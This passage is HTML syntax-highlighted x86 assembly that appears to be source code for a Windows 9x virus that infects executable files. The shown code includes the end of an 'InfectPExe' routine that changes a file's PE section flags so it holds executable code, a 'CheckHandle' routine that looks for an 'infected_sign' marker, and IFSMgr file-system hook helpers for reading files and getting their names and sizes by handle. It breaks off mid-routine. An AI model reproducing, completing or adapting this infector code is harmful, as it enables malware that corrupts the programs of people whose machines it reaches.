                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_ish.PointerToRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.FileSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.pe_ish.SectionCharacteristics</span><span class="sc4">],</span><span class="sc0"> \
                          </span><span class="sc5">IMAGE_SCN_CNT_CODE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_EXECUTE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \
                          </span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">InfectPExeOk</span><span class="sc0">

</span><span class="sc5">InfectPExeErr</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc5">CFbit</span><span class="sc0">
</span><span class="sc5">InfectPExeOk</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">popfd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; check handle for infected or not</span><span class="sc0">
</span><span class="sc1">;   entry:</span><span class="sc0">
</span><span class="sc1">;     ebx = pointer to the ifsreq</span><span class="sc0">
</span><span class="sc1">;   return:</span><span class="sc0">
</span><span class="sc1">;     CFlag = 0 (no error)</span><span class="sc0">
</span><span class="sc1">;       eax == 0 -&gt; not infected</span><span class="sc0">
</span><span class="sc1">;       eax &gt;  0 -&gt; infected</span><span class="sc0">
</span><span class="sc1">;     CFlag = 1 (error)</span><span class="sc0">
</span><span class="sc5">CheckHandle</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">pushfd</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">eh</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pifshp</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esi.hdat.eh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetST</span><span class="sc4">&amp;</span><span class="sc5">ReadFile</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">CheckHandleRetC</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">CheckHandleRetC</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">eh</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esi.eh_checksum</span><span class="sc4">],</span><span class="sc5">infected_sign</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">CheckHandleSaveEAX</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFileSizeByHandle</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">CheckHandleRetC</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">hdat</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">hdat</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc5">hdat.eh</span><span class="sc4">)</span><span class="sc5">.hdat</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReadFile</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">CheckHandleRetC</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">CheckHandleRetC</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">hdat</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esi.InfectedSign</span><span class="sc4">],</span><span class="sc5">infected_sign</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">CheckHandleSaveEAX</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">CheckHandleSaveEAX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">CheckHandleRet</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">popfd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CheckHandleRetC</span><span class="sc4">:</span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc5">CFbit</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CheckHandleRet</span><span class="sc0">


</span><span class="sc1">; get hndlfunc structure</span><span class="sc0">
</span><span class="sc1">;   entry:</span><span class="sc0">
</span><span class="sc1">;     ebx = pointer to the ifsreq</span><span class="sc0">
</span><span class="sc1">;   return:</span><span class="sc0">
</span><span class="sc1">;     eax = return the pointer of hndlfunc structure</span><span class="sc0">
</span><span class="sc5">GetHndlfunc</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pifshp</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">GetHndlfuncFromIfsreq</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.our_hfunc</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">GetHndlfuncFromIfsreq</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetHndlfuncFromIfsreq</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifsreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ifs_pfh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">fhandle</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.fh_hf</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; get file size by handle</span><span class="sc0">
</span><span class="sc1">;   entry:</span><span class="sc0">
</span><span class="sc1">;     ebx = pointer to the ifsreq</span><span class="sc0">
</span><span class="sc1">;   return:</span><span class="sc0">
</span><span class="sc1">;     CFlag = 0 (no error)</span><span class="sc0">
</span><span class="sc1">;       eax = returns the size of file</span><span class="sc0">
</span><span class="sc1">;     CFlag = 1 (error)</span><span class="sc0">
</span><span class="sc1">;       eax = error code</span><span class="sc0">
</span><span class="sc5">GetFileSizeByHandle</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushfd</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_flags</span><span class="sc4">],</span><span class="sc5">FILE_END</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_pos</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetHndlfunc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">hndlfunc</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.hf_misc</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">hndlmisc</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.hm_func</span><span class="sc4">+</span><span class="sc5">HM_SEEK</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_error</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">CFbit</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">GetSizeDone</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_pos</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GetSizeDone</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">popfd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; get heap for ifshp</span><span class="sc0">
</span><span class="sc1">;   return:</span><span class="sc0">
</span><span class="sc1">;     CFlag = 0 (no error)</span><span class="sc0">
</span><span class="sc1">;       eax = pointer to the ifshp</span><span class="sc0">
</span><span class="sc1">;     CFlag = 1 (error)</span><span class="sc0">
</span><span class="sc1">;       eax = 0</span><span class="sc0">
</span><span class="sc5">GetIfshp</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pushfd</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">ifshp</span><span class="sc0">
</span><span class="sc5">VxDCall4</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_GetHeap</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">GetIfshpDone</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pifshp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">pir</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.our_ifsreq</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">ifsreq</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc5">GetIfshpDone</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pifshp</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">CFbit</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">CFbit</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">popfd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pifshp</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; ret heap of ifshp</span><span class="sc0">
</span><span class="sc1">; return: none</span><span class="sc0">
</span><span class="sc5">RetIfshp</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pushfd</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pifshp</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">RetIfshpDone</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">VxDCall5</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_RetHeap</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pifshp</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RetIfshpDone</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">popfd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; get find info by handle</span><span class="sc0">
</span><span class="sc1">;   entry:</span><span class="sc0">
</span><span class="sc1">;     ebx = pointer to the ifsreq</span><span class="sc0">
</span><span class="sc1">;     eax = pointer to a buffer the unicode pathname in the ParsedPath</span><span class="sc0">
</span><span class="sc1">;           structure format is to be returned</span><span class="sc0">
</span><span class="sc1">;   return:</span><span class="sc0">
</span><span class="sc1">;     CFlag = 0 (no error)</span><span class="sc0">
</span><span class="sc1">;       eax = filled in with the unicode pathname in the ParsedPath</span><span class="sc0">
</span><span class="sc1">;             structure format</span><span class="sc0">
</span><span class="sc1">;     CFlag = 1 (error)</span><span class="sc0">
</span><span class="sc1">;       eax = error code</span><span class="sc0">
</span><span class="sc5">GetFindInfoByHandle</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushfd</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_flags</span><span class="sc4">],</span><span class="sc5">ENUMH_GETFINDINFO</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_ppath</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetHndlfunc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">hndlfunc</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.hf_misc</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">hndlmisc</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.hm_func</span><span class="sc4">+</span><span class="sc5">HM_ENUMHANDLE</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_error</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">CFbit</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">popfd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; get file name by handle (enumerate handle)</span><span class="sc0">
</span><span class="sc1">;   entry:</span><span class="sc0">
</span><span class="sc1">;     ebx = pointer to the ifsreq</span><span class="sc0">
</span><span class="sc1">;     esi = pointer to a buffer the unicode pathname in the ParsedPath</span><span class="sc0">
</span><span class="sc1">;           structure format is to be returned</span><span class="sc0">
</span><span class="sc1">;     ecx = the maximum length in bytes of the buffer(edi),</span><span class="sc0">
</span><span class="sc1">;           excluding the NUL character</span><span class="sc0">
</span><span class="sc1">;     edi = pointer to a buffer the BCS pathname is to be returned</span><span class="sc0">
</span><span class="sc1">;   return:</span><span class="sc0">
</span><span class="sc1">;     CFlag = 0 (no error)</span><span class="sc0">
</span><span class="sc1">;       eax = return the number of bytes in the converted unicode pathname</span><span class="sc0">
</span><span class="sc1">;       esi = filled in with the unicode pathname in the ParsedPath</span><span class="sc0">
</span><span class="sc1">;             structure format</span><span class="sc0">
</span><span class="sc1">;       edi = filled in with the BCS pathname</span><span class="sc0">
</span><span class="sc1">;     CFlag = 1 (error)</span><span class="sc0">
</span><span class="sc1">;       eax = error code</span><span class="sc0">
</span><span class="sc5">GetFileNameByHandle</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushfd</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_flags</span><span class="sc4">],</span><span class="sc5">ENUMH_GETFILENAME</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_ppath</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetHndlfunc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">hndlfunc</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.hf_misc</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">hndlmisc</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.hm_func</span><span class="sc4">+</span><span class="sc5">HM_ENUMHANDLE</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_error</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">CFbit</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">GfnbhDone</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">Drive</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">volUNC_charFSD</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
